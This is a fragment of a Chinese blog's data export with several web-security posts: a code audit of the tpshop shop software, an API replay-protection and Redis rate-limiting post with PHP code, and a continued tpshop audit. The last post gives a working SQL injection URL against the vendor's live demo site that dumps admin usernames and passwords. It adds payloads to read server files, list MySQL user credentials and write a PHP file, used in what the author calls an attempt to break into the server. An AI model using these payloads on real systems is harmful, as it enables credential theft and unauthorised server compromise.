action_id,log_time,status_desc,order_status FROM ((SELECT * FROM __PREFIX__order_action WHERE order_id = $id AND status_desc &lt;&gt;&apos;&apos; ORDER BY action_id) AS a) GROUP BY status_desc ORDER BY action_id&quot;;</div><div class=\"line\">$items = M()-&gt;fetchSql(true)-&gt;query($sql);</div></pre></td></tr></table></figure></p>\n<p>如上所见,简单粗暴,没有任何处理的拼接.简直最佳注入点啊<br>可惜的是,在详细的看了语句之后,发现并没有想象的那么简单<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">SELECT action_id,log_time,status_desc,order_status FROM ((SELECT * FROM __PREFIX__order_action WHERE order_id =</div></pre></td></tr></table></figure></p>\n<p>这之后的语句可以随意编写,但是我却找不到方法.并且在这句拼接之后,还用了’id’参数进行别的查询:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$invoice_no = M(&apos;DeliveryDoc&apos;)-&gt;where(&quot;order_id = $id&quot;)-&gt;getField(&apos;invoice_no&apos;,true);</div></pre></td></tr></table></figure></p>\n<p>导致语句错误<br>一次失败的代码审计……看来web安全之路还有很长啊<br>ps:虽然没有注入,但是代码本身没有做订单id与用户绑定的操作,所以可以通过遍历id获取信息</p>\n","excerpt":"<h3 id=\"题记-本人web安全方面新手-因以前常用tp框架-在tp官网上看到了一个叫做tpshop的开源产品-忍不住想要找一找BUG\"><a href=\"#题记-本人web安全方面新手-因以前常用tp框架-在tp官网上看到了一个叫做tpshop的开源产品-忍不住想要找一找BUG\" class=\"headerlink\" title=\"题记:本人web安全方面新手,因以前常用tp框架,在tp官网上看到了一个叫做tpshop的开源产品,忍不住想要找一找BUG\"></a>题记:本人web安全方面新手,因以前常用tp框架,在tp官网上看到了一个叫做tpshop的开源产品,忍不住想要找一找BUG</h3><p><strong>首先,这是一次失败的代码审计,找到了一个用户收藏商品的csrf漏洞,找到了一个sql注入点,却没有找到能注入的方法</strong>  </p>","more":"<p>首先说csrf的寻找过程,意外的简单……<br>原本我是要去找新增评论方法的漏洞,看了一会儿,没有发现能利用的地方,正准备去其他的地方的时候,在这个方法下面发现了用户收藏的方法,代码如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">/**</div><div class=\"line\">* 用户收藏某一件商品</div><div class=\"line\">* @param type $goods_id</div><div class=\"line\">*/</div><div class=\"line\">public function collect_goods($goods_id)</div><div class=\"line\">&#123;</div><div class=\"line\">  $goods_id = I(&apos;goods_id&apos;);</div><div class=\"line\">  $goodsLogic = new \\Home\\Logic\\GoodsLogic();        </div><div class=\"line\">  $result = $goodsLogic-&gt;collect_goods(cookie(&apos;user_id&apos;),$goods_id);</div><div class=\"line\">  exit(json_encode($result));</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>一眼看过去,这绝对是有问题的啊,没有任何验证.所以我简单的用jq的ajax方法测试了一个,果然成功了;  </p>\n<p><strong>下面说sql注入点</strong><br>上面的成功寻找给了我信心,这个产品是有问题!<br>我就去想,tp有什么方法是有问题的,由此想到了<code>-&gt;query()</code>方法,这个方法执行的sql语句是没有参数化的,所以如果在这个方法中的sql语句存在拼接参数的话,是有可能会有注入的.<br>按照上面的思路,我开始搜索Home控制器下的<code>-&gt;query()</code>,果然搜索到了好几个地方,于是一一检查,可惜检查了好几个都是没有拼接参数的,直到最后一个!<br>Home/UserController控制器下的<code>order_detail</code>方法,get参数’id’直接拼接在了query中.代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$sql = &quot;SELECT action_id,log_time,status_desc,order_status FROM ((SELECT * FROM __PREFIX__order_action WHERE order_id = $id AND status_desc &lt;&gt;&apos;&apos; ORDER BY action_id) AS a) GROUP BY status_desc ORDER BY action_id&quot;;</div><div class=\"line\">$items = M()-&gt;fetchSql(true)-&gt;query($sql);</div></pre></td></tr></table></figure></p>\n<p>如上所见,简单粗暴,没有任何处理的拼接.简直最佳注入点啊<br>可惜的是,在详细的看了语句之后,发现并没有想象的那么简单<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">SELECT action_id,log_time,status_desc,order_status FROM ((SELECT * FROM __PREFIX__order_action WHERE order_id =</div></pre></td></tr></table></figure></p>\n<p>这之后的语句可以随意编写,但是我却找不到方法.并且在这句拼接之后,还用了’id’参数进行别的查询:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$invoice_no = M(&apos;DeliveryDoc&apos;)-&gt;where(&quot;order_id = $id&quot;)-&gt;getField(&apos;invoice_no&apos;,true);</div></pre></td></tr></table></figure></p>\n<p>导致语句错误<br>一次失败的代码审计……看来web安全之路还有很长啊<br>ps:虽然没有注入,但是代码本身没有做订单id与用户绑定的操作,所以可以通过遍历id获取信息</p>"},{"title":"Api安全 研究","_content":"\n**继续研究接口系列的东西,这回是安全方面的防重放攻击与限流**\n\n<!--more-->  \n\n**首先是防止重放攻击的\"签名+时间戳\"方法.**  \n\n*因为据了解apk的反编译并不难,所以我认为\"签名\"已经是防君子不防小人的东西了*  \n\n签名的算法大致都是相同的:即请求参数+时间戳+token+盐等,hash加密后传  \n也有的需要解密,所以不使用hash,使用对称加密的.   \n```json\n{\n\t'data' : {\n\t\t'id' : 1\n\t},\n\t'time' : 14000000000,,\n\t'token' : 'xxxxxxxxxx',\n\t'salt' : '%^$#FJfdsd^*34'\n}\n```\n服务器端先验证时间戳超时  \n后同样的算法验证一下签名是否一致,判定成功后将签名存入缓存(缓存的时间应为验证时间戳超时的时间),下次验证签名是否存在,防止重放攻击  \n\n\n**再说限流,因为\"DOS攻击(Denial of Service Attack)\",所以限流的存在还是很有必要的,虽然一般限流都是运维的工作**  \n*万一运维不会的话,就有用到的时候了*  \n\n常用的限流算法有两种: 漏桶算法和令牌桶算法  \n漏桶算法的思路很简单,水()请求)先进入到漏桶里,漏桶以一定的速度出水,当水流入速度过大会直接溢出,可以看出漏桶算法能强行限制数据的传输速率  \n令牌桶的思路是: 所有的流量要放行前都要消耗一定量的token,所有的token都存放在一个bucket(桶)内,每经过一个时间周期(每1/r秒),都会在bucket中放入一个token,bucket有着最大的容量.当token存满容器并且没有消耗时,新的产出token将会被抛弃  \n\n**上面的两种算法都是有着持久化的需求(不断放水与不断加入令牌),但是web服务是访问时才会运行,所以不适用这两种方法,经过半天的思考,我想出了一个\"冲水算法\"**  \n**冲水就是在有需要的时候,把不需要的东西冲掉,例如,每次方便后按下冲水按钮一样,详细的过程请看代码注释!**  \n```php\n//用的lumen框架 php扩展的Redis\n// 设置限制条件,也就是redis存储的名称 可更改为其他(用户id等)\n$ip  = $_SERVER['REMOTE_ADDR'];\n// total 为容器大小,即: $cycle时间内最多有x次访问\n$total = 10;\n// cycle 为时间周期,即: x时间内最多有$total词访问\n$cycle = 10;\n// 黑名单持续时间\n$blackTime = 600;\n// 验证黑名单\nif ($redis->get('blackIp:'.$ip)){\n  $ttl = $redis->ttl('blackIp:'.$ip);\n  return response(['error' => \"Access Denied time:\".$ttl], 403);\n}\n// 获取容器里的内容\n$bucket = $redis->lrange('ip:'.$ip,0,$total-1);\nif ($bucket){\n  // 通过循环判断是否过期,因为Redis的存储方式是时间戳正序存入,所以可以找到未过期的内容即为停止\n  foreach ($bucket as $k => $v){\n    // 判断一个时间周期内是否有内容过期\n    if ((time() - $cycle*$total) < (int)$v){\n      // 存下尚未过期内容,冲掉已过期内容\n      $redis->ltrim('ip:'.$ip, $k, 9);\n      // 将起始数定为当前key\n      $start = $k;\n      break;\n    }\n  }\n  // 如果内容全部过期,则删除全部内容\n  if (!isset($start)){\n    app('phpRedis')->del('ip:'.$ip);\n  }else{\n    // 如果起始数为0,证明没有过期内容,并且容器已满,加入黑名单\n    if ($start == 0 && count($bucket) == $total){\n    app('phpRedis')->setex('blackIp:'.$ip, $blackTime, $ip);\n    }\n  }\n}\n// 存储访问记录\n$redis->rpush('ip:'.$ip,time());\n$redis->expire('ip:'.$ip,3600);\n```","source":"_posts/Api安全研究.md","raw":"---\ntitle: Api安全 研究\n---\n\n**继续研究接口系列的东西,这回是安全方面的防重放攻击与限流**\n\n<!--more-->  \n\n**首先是防止重放攻击的\"签名+时间戳\"方法.**  \n\n*因为据了解apk的反编译并不难,所以我认为\"签名\"已经是防君子不防小人的东西了*  \n\n签名的算法大致都是相同的:即请求参数+时间戳+token+盐等,hash加密后传  \n也有的需要解密,所以不使用hash,使用对称加密的.   \n```json\n{\n\t'data' : {\n\t\t'id' : 1\n\t},\n\t'time' : 14000000000,,\n\t'token' : 'xxxxxxxxxx',\n\t'salt' : '%^$#FJfdsd^*34'\n}\n```\n服务器端先验证时间戳超时  \n后同样的算法验证一下签名是否一致,判定成功后将签名存入缓存(缓存的时间应为验证时间戳超时的时间),下次验证签名是否存在,防止重放攻击  \n\n\n**再说限流,因为\"DOS攻击(Denial of Service Attack)\",所以限流的存在还是很有必要的,虽然一般限流都是运维的工作**  \n*万一运维不会的话,就有用到的时候了*  \n\n常用的限流算法有两种: 漏桶算法和令牌桶算法  \n漏桶算法的思路很简单,水()请求)先进入到漏桶里,漏桶以一定的速度出水,当水流入速度过大会直接溢出,可以看出漏桶算法能强行限制数据的传输速率  \n令牌桶的思路是: 所有的流量要放行前都要消耗一定量的token,所有的token都存放在一个bucket(桶)内,每经过一个时间周期(每1/r秒),都会在bucket中放入一个token,bucket有着最大的容量.当token存满容器并且没有消耗时,新的产出token将会被抛弃  \n\n**上面的两种算法都是有着持久化的需求(不断放水与不断加入令牌),但是web服务是访问时才会运行,所以不适用这两种方法,经过半天的思考,我想出了一个\"冲水算法\"**  \n**冲水就是在有需要的时候,把不需要的东西冲掉,例如,每次方便后按下冲水按钮一样,详细的过程请看代码注释!**  \n```php\n//用的lumen框架 php扩展的Redis\n// 设置限制条件,也就是redis存储的名称 可更改为其他(用户id等)\n$ip  = $_SERVER['REMOTE_ADDR'];\n// total 为容器大小,即: $cycle时间内最多有x次访问\n$total = 10;\n// cycle 为时间周期,即: x时间内最多有$total词访问\n$cycle = 10;\n// 黑名单持续时间\n$blackTime = 600;\n// 验证黑名单\nif ($redis->get('blackIp:'.$ip)){\n  $ttl = $redis->ttl('blackIp:'.$ip);\n  return response(['error' => \"Access Denied time:\".$ttl], 403);\n}\n// 获取容器里的内容\n$bucket = $redis->lrange('ip:'.$ip,0,$total-1);\nif ($bucket){\n  // 通过循环判断是否过期,因为Redis的存储方式是时间戳正序存入,所以可以找到未过期的内容即为停止\n  foreach ($bucket as $k => $v){\n    // 判断一个时间周期内是否有内容过期\n    if ((time() - $cycle*$total) < (int)$v){\n      // 存下尚未过期内容,冲掉已过期内容\n      $redis->ltrim('ip:'.$ip, $k, 9);\n      // 将起始数定为当前key\n      $start = $k;\n      break;\n    }\n  }\n  // 如果内容全部过期,则删除全部内容\n  if (!isset($start)){\n    app('phpRedis')->del('ip:'.$ip);\n  }else{\n    // 如果起始数为0,证明没有过期内容,并且容器已满,加入黑名单\n    if ($start == 0 && count($bucket) == $total){\n    app('phpRedis')->setex('blackIp:'.$ip, $blackTime, $ip);\n    }\n  }\n}\n// 存储访问记录\n$redis->rpush('ip:'.$ip,time());\n$redis->expire('ip:'.$ip,3600);\n```","slug":"Api安全研究","published":1,"date":"2016-10-21T07:21:38.263Z","updated":"2016-10-25T03:24:36.081Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cix5vkhd700071si4xvsj7z3p","content":"<p><strong>继续研究接口系列的东西,这回是安全方面的防重放攻击与限流</strong></p>\n<a id=\"more\"></a>  \n<p><strong>首先是防止重放攻击的”签名+时间戳”方法.</strong>  </p>\n<p><em>因为据了解apk的反编译并不难,所以我认为”签名”已经是防君子不防小人的东西了</em>  </p>\n<p>签名的算法大致都是相同的:即请求参数+时间戳+token+盐等,hash加密后传<br>也有的需要解密,所以不使用hash,使用对称加密的.<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">\t'data' : &#123;</div><div class=\"line\">\t\t'id' : 1</div><div class=\"line\">\t&#125;,</div><div class=\"line\">\t'time' : 14000000000,,</div><div class=\"line\">\t'token' : 'xxxxxxxxxx',</div><div class=\"line\">\t'salt' : '%^$#FJfdsd^*34'</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>服务器端先验证时间戳超时<br>后同样的算法验证一下签名是否一致,判定成功后将签名存入缓存(缓存的时间应为验证时间戳超时的时间),下次验证签名是否存在,防止重放攻击  </p>\n<p><strong>再说限流,因为”DOS攻击(Denial of Service Attack)”,所以限流的存在还是很有必要的,虽然一般限流都是运维的工作</strong><br><em>万一运维不会的话,就有用到的时候了</em>  </p>\n<p>常用的限流算法有两种: 漏桶算法和令牌桶算法<br>漏桶算法的思路很简单,水()请求)先进入到漏桶里,漏桶以一定的速度出水,当水流入速度过大会直接溢出,可以看出漏桶算法能强行限制数据的传输速率<br>令牌桶的思路是: 所有的流量要放行前都要消耗一定量的token,所有的token都存放在一个bucket(桶)内,每经过一个时间周期(每1/r秒),都会在bucket中放入一个token,bucket有着最大的容量.当token存满容器并且没有消耗时,新的产出token将会被抛弃  </p>\n<p><strong>上面的两种算法都是有着持久化的需求(不断放水与不断加入令牌),但是web服务是访问时才会运行,所以不适用这两种方法,经过半天的思考,我想出了一个”冲水算法”</strong><br><strong>冲水就是在有需要的时候,把不需要的东西冲掉,例如,每次方便后按下冲水按钮一样,详细的过程请看代码注释!</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//用的lumen框架 php扩展的Redis</span></div><div class=\"line\"><span class=\"comment\">// 设置限制条件,也就是redis存储的名称 可更改为其他(用户id等)</span></div><div class=\"line\">$ip  = $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>];</div><div class=\"line\"><span class=\"comment\">// total 为容器大小,即: $cycle时间内最多有x次访问</span></div><div class=\"line\">$total = <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"comment\">// cycle 为时间周期,即: x时间内最多有$total词访问</span></div><div class=\"line\">$cycle = <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"comment\">// 黑名单持续时间</span></div><div class=\"line\">$blackTime = <span class=\"number\">600</span>;</div><div class=\"line\"><span class=\"comment\">// 验证黑名单</span></div><div class=\"line\"><span class=\"keyword\">if</span> ($redis-&gt;get(<span class=\"string\">'blackIp:'</span>.$ip))&#123;</div><div class=\"line\">  $ttl = $redis-&gt;ttl(<span class=\"string\">'blackIp:'</span>.$ip);</div><div class=\"line\">  <span class=\"keyword\">return</span> response([<span class=\"string\">'error'</span> =&gt; <span class=\"string\">\"Access Denied time:\"</span>.$ttl], <span class=\"number\">403</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"comment\">// 获取容器里的内容</span></div><div class=\"line\">$bucket = $redis-&gt;lrange(<span class=\"string\">'ip:'</span>.$ip,<span class=\"number\">0</span>,$total<span class=\"number\">-1</span>);</div><div class=\"line\"><span class=\"keyword\">if</span> ($bucket)&#123;</div><div class=\"line\">  <span class=\"comment\">// 通过循环判断是否过期,因为Redis的存储方式是时间戳正序存入,所以可以找到未过期的内容即为停止</span></div><div class=\"line\">  <span class=\"keyword\">foreach</span> ($bucket <span class=\"keyword\">as</span> $k =&gt; $v)&#123;</div><div class=\"line\">    <span class=\"comment\">// 判断一个时间周期内是否有内容过期</span></div><div class=\"line\">    <span class=\"keyword\">if</span> ((time() - $cycle*$total) &lt; (int)$v)&#123;</div><div class=\"line\">      <span class=\"comment\">// 存下尚未过期内容,冲掉已过期内容</span></div><div class=\"line\">      $redis-&gt;ltrim(<span class=\"string\">'ip:'</span>.$ip, $k, <span class=\"number\">9</span>);</div><div class=\"line\">      <span class=\"comment\">// 将起始数定为当前key</span></div><div class=\"line\">      $start = $k;</div><div class=\"line\">      <span class=\"keyword\">break</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"comment\">// 如果内容全部过期,则删除全部内容</span></div><div class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($start))&#123;</div><div class=\"line\">    app(<span class=\"string\">'phpRedis'</span>)-&gt;del(<span class=\"string\">'ip:'</span>.$ip);</div><div class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 如果起始数为0,证明没有过期内容,并且容器已满,加入黑名单</span></div><div class=\"line\">    <span class=\"keyword\">if</span> ($start == <span class=\"number\">0</span> &amp;&amp; count($bucket) == $total)&#123;</div><div class=\"line\">    app(<span class=\"string\">'phpRedis'</span>)-&gt;setex(<span class=\"string\">'blackIp:'</span>.$ip, $blackTime, $ip);</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"comment\">// 存储访问记录</span></div><div class=\"line\">$redis-&gt;rpush(<span class=\"string\">'ip:'</span>.$ip,time());</div><div class=\"line\">$redis-&gt;expire(<span class=\"string\">'ip:'</span>.$ip,<span class=\"number\">3600</span>);</div></pre></td></tr></table></figure></p>\n","excerpt":"<p><strong>继续研究接口系列的东西,这回是安全方面的防重放攻击与限流</strong></p>","more":"<p><strong>首先是防止重放攻击的”签名+时间戳”方法.</strong>  </p>\n<p><em>因为据了解apk的反编译并不难,所以我认为”签名”已经是防君子不防小人的东西了</em>  </p>\n<p>签名的算法大致都是相同的:即请求参数+时间戳+token+盐等,hash加密后传<br>也有的需要解密,所以不使用hash,使用对称加密的.<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">\t'data' : &#123;</div><div class=\"line\">\t\t'id' : 1</div><div class=\"line\">\t&#125;,</div><div class=\"line\">\t'time' : 14000000000,,</div><div class=\"line\">\t'token' : 'xxxxxxxxxx',</div><div class=\"line\">\t'salt' : '%^$#FJfdsd^*34'</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>服务器端先验证时间戳超时<br>后同样的算法验证一下签名是否一致,判定成功后将签名存入缓存(缓存的时间应为验证时间戳超时的时间),下次验证签名是否存在,防止重放攻击  </p>\n<p><strong>再说限流,因为”DOS攻击(Denial of Service Attack)”,所以限流的存在还是很有必要的,虽然一般限流都是运维的工作</strong><br><em>万一运维不会的话,就有用到的时候了</em>  </p>\n<p>常用的限流算法有两种: 漏桶算法和令牌桶算法<br>漏桶算法的思路很简单,水()请求)先进入到漏桶里,漏桶以一定的速度出水,当水流入速度过大会直接溢出,可以看出漏桶算法能强行限制数据的传输速率<br>令牌桶的思路是: 所有的流量要放行前都要消耗一定量的token,所有的token都存放在一个bucket(桶)内,每经过一个时间周期(每1/r秒),都会在bucket中放入一个token,bucket有着最大的容量.当token存满容器并且没有消耗时,新的产出token将会被抛弃  </p>\n<p><strong>上面的两种算法都是有着持久化的需求(不断放水与不断加入令牌),但是web服务是访问时才会运行,所以不适用这两种方法,经过半天的思考,我想出了一个”冲水算法”</strong><br><strong>冲水就是在有需要的时候,把不需要的东西冲掉,例如,每次方便后按下冲水按钮一样,详细的过程请看代码注释!</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//用的lumen框架 php扩展的Redis</span></div><div class=\"line\"><span class=\"comment\">// 设置限制条件,也就是redis存储的名称 可更改为其他(用户id等)</span></div><div class=\"line\">$ip  = $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>];</div><div class=\"line\"><span class=\"comment\">// total 为容器大小,即: $cycle时间内最多有x次访问</span></div><div class=\"line\">$total = <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"comment\">// cycle 为时间周期,即: x时间内最多有$total词访问</span></div><div class=\"line\">$cycle = <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"comment\">// 黑名单持续时间</span></div><div class=\"line\">$blackTime = <span class=\"number\">600</span>;</div><div class=\"line\"><span class=\"comment\">// 验证黑名单</span></div><div class=\"line\"><span class=\"keyword\">if</span> ($redis-&gt;get(<span class=\"string\">'blackIp:'</span>.$ip))&#123;</div><div class=\"line\">  $ttl = $redis-&gt;ttl(<span class=\"string\">'blackIp:'</span>.$ip);</div><div class=\"line\">  <span class=\"keyword\">return</span> response([<span class=\"string\">'error'</span> =&gt; <span class=\"string\">\"Access Denied time:\"</span>.$ttl], <span class=\"number\">403</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"comment\">// 获取容器里的内容</span></div><div class=\"line\">$bucket = $redis-&gt;lrange(<span class=\"string\">'ip:'</span>.$ip,<span class=\"number\">0</span>,$total<span class=\"number\">-1</span>);</div><div class=\"line\"><span class=\"keyword\">if</span> ($bucket)&#123;</div><div class=\"line\">  <span class=\"comment\">// 通过循环判断是否过期,因为Redis的存储方式是时间戳正序存入,所以可以找到未过期的内容即为停止</span></div><div class=\"line\">  <span class=\"keyword\">foreach</span> ($bucket <span class=\"keyword\">as</span> $k =&gt; $v)&#123;</div><div class=\"line\">    <span class=\"comment\">// 判断一个时间周期内是否有内容过期</span></div><div class=\"line\">    <span class=\"keyword\">if</span> ((time() - $cycle*$total) &lt; (int)$v)&#123;</div><div class=\"line\">      <span class=\"comment\">// 存下尚未过期内容,冲掉已过期内容</span></div><div class=\"line\">      $redis-&gt;ltrim(<span class=\"string\">'ip:'</span>.$ip, $k, <span class=\"number\">9</span>);</div><div class=\"line\">      <span class=\"comment\">// 将起始数定为当前key</span></div><div class=\"line\">      $start = $k;</div><div class=\"line\">      <span class=\"keyword\">break</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"comment\">// 如果内容全部过期,则删除全部内容</span></div><div class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($start))&#123;</div><div class=\"line\">    app(<span class=\"string\">'phpRedis'</span>)-&gt;del(<span class=\"string\">'ip:'</span>.$ip);</div><div class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 如果起始数为0,证明没有过期内容,并且容器已满,加入黑名单</span></div><div class=\"line\">    <span class=\"keyword\">if</span> ($start == <span class=\"number\">0</span> &amp;&amp; count($bucket) == $total)&#123;</div><div class=\"line\">    app(<span class=\"string\">'phpRedis'</span>)-&gt;setex(<span class=\"string\">'blackIp:'</span>.$ip, $blackTime, $ip);</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"comment\">// 存储访问记录</span></div><div class=\"line\">$redis-&gt;rpush(<span class=\"string\">'ip:'</span>.$ip,time());</div><div class=\"line\">$redis-&gt;expire(<span class=\"string\">'ip:'</span>.$ip,<span class=\"number\">3600</span>);</div></pre></td></tr></table></figure></p>"},{"title":"tpshop代码审计--续","_content":"### 商城这股浪潮不是过去了好久了吗?为什么还会有这种程序的出现  \n\n<!--more--> \n\n**问题1**  \n\n模版代码保存在根目录下的Template目录下,并且官网的demo也没有做出访问限制,就是说代码随便看......  \n\n**问题2**  \n\n好多查询都是字符串拼接放入where里,导致全是注入点  \n\n顺带记录一下失败的查询:在搜索控制器中发现注入点,测试后发现不是直接输出,于是在上一个注入点中构造一个带有下一个注入语句的查询结果,结果是失败了,因为下一个查询是做比对用的,也没有直接输出  \n\n算了,已经不想再找问题了,全是问题  \n\n注入也终于成功了一次,注入点是文章id:  \n\n```\nhttp://demo2.tp-shop.cn/index.php/Home/Article/detail/article_id/123456789 )\nUNION ALL\nSELECT `user_name`,2,`user_name`,\n`password`,`user_name`,`user_name`,`user_name`,`user_name`,\n`user_name`,`user_name`,`user_name`,`user_name`,`user_name`,\n`user_name`,`user_name`,`user_name`, `user_name` FROM tp_admin\n-- hack\n```\n\n感觉这个网站就算是给安全新手练手都觉得太简单了.  \n\n**后记:**  \n代码全都是漏洞,所以想着利用demo进去服务器看看  \n通过代码审计找到sql注入漏洞 然后根据注入试图提权,用了各种方法,发现用户不是root,没有写入与读取权限,失败  \n\n```\n/*select 1,2,3,load_file(char(69,58,92,112)),5,6,7,8,9,10,11,12,13,14,15,16,17文件读取 十六进制或char(十进制)\n/*select 1,2,3,user,password,6,7,8,9,10,11,12,13,14,15,16,17 from mysql.user用户查看\n#UNION \nSELECT '<? echo 1; ?>',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 INTO OUTFILE \"xxxx/123.php\"文件写入 get传入url会删除'后的代码 测试时是post\n```","source":"_posts/tpshop代码审计--续.md","raw":"---\ntitle:  tpshop代码审计--续\n---\n### 商城这股浪潮不是过去了好久了吗?为什么还会有这种程序的出现  \n\n<!--more--> \n\n**问题1**  \n\n模版代码保存在根目录下的Template目录下,并且官网的demo也没有做出访问限制,就是说代码随便看......  \n\n**问题2**  \n\n好多查询都是字符串拼接放入where里,导致全是注入点  \n\n顺带记录一下失败的查询:在搜索控制器中发现注入点,测试后发现不是直接输出,于是在上一个注入点中构造一个带有下一个注入语句的查询结果,结果是失败了,因为下一个查询是做比对用的,也没有直接输出  \n\n算了,已经不想再找问题了,全是问题  \n\n注入也终于成功了一次,注入点是文章id:  \n\n```\nhttp://demo2.tp-shop.cn/index.php/Home/Article/detail/article_id/123456789 )\nUNION ALL\nSELECT `user_name`,2,`user_name`,\n`password`,`user_name`,`user_name`,`user_name`,`user_name`,\n`user_name`,`user_name`,`user_name`,`user_name`,`user_name`,\n`user_name`,`user_name`,`user_name`, `user_name` FROM tp_admin\n-- hack\n```\n\n感觉这个网站就算是给安全新手练手都觉得太简单了.  \n\n**后记:**  \n代码全都是漏洞,所以想着利用demo进去服务器看看  \n通过代码审计找到sql注入漏洞 然后根据注入试图提权,用了各种方法,发现用户不是root,没有写入与读取权限,失败  \n\n```\n/*select 1,2,3,load_file(char(69,58,92,112)),5,6,7,8,9,10,11,12,13,14,15,16,17文件读取 十六进制或char(十进制)\n/*select 1,2,3,user,password,6,7,8,9,10,11,12,13,14,15,16,17 from mysql.user用户查看\n#UNION \nSELECT '<? echo 1; ?>',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 INTO OUTFILE \"xxxx/123.php\"文件写入 get传入url会删除'后的代码 测试时是post\n```","slug":"tpshop代码审计--续","published":1,"date":"2016-10-17T05:05:46.574Z","updated":"2016-10-17T08:57:19.589Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cix5vkhds00091si45sxxhj5u","content":"<h3 id=\"商城这股浪潮不是过去了好久了吗-为什么还会有这种程序的出现\"><a href=\"#商城这股浪潮不是过去了好久了吗-为什么还会有这种程序的出现\" class=\"headerlink\" 